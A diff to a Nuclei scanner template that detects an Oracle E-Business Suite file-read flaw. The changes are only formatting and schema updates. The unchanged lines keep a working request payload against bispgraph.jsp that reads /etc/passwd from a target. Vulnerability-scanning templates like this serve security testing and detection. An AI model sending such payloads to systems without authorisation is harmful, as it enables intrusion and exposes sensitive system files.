@@ -1,9 +1,10 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: oracle-ebs-bispgrapgh-file-read
 info:
   name: Oracle EBS Bispgraph File Access
   author: "Alfie Njeru (@emenalf) - https://the-infosec.com"
-  severity: Critical
-requests:
+  severity: critical
+http:
   - method: GET
     path:
       - "{{BaseURL}}/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/"
